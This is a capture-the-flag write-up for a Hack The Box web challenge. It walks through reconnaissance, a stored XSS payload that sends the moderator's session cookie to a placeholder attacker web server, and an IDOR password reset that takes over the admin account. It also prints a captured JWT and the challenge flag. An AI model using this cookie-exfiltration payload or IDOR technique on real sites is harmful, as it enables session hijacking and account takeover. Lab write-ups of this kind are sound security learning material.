# Kryptos Support (Web)

![Kryptos Ticket Submission](kryptos_support1.png)

## Initial Recon

Examing source code and looking at the HTTP requests in BurpSuite, found two endpoints:
- `/api/tickets`
- `/api/login`

GoBuster yielded no usable results.

## XSS Injection

Started an HTTP server on my machine and started experimenting with different XSS payloads.

`python3 -m http.server 80`
  
Found a winner!

`<img src=x onerror="location.href='http://your-web-server/?cookie=' + document.cookie">`

Checking our python3 web server, we can see we've now got a session cookie!

`/?cookie=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI`

Manually put the cookie into your browser, and BOOM, we're logged in as `moderator` and can see the list of support tickets at `/tickets`.

![Kryptos Ticket List](kryptos_support2.png)

## Further Exploitation

Once logged in as `moderator`, we can see a link for a "Settings" page in the top left. This page allows you to change your password (without knowing the current password), and uses the endpoint: `/api/users/update`

Capturing a password change for our current session, Burp shows us the following information included in the POST request:

    {
        "password":"test",
        "uid":"100"
    }

Guessing the admin account may have a uid of 1, we use Burp repeater to send the following POST:


    {
        "password":"test",
        "uid":"1"
    }
    
Now, delete your cookies, return to the `/login` page, and login as `admin:test`.

There's your flag! `HTB{x55_4nd_id0rs_ar3_fun!!}`
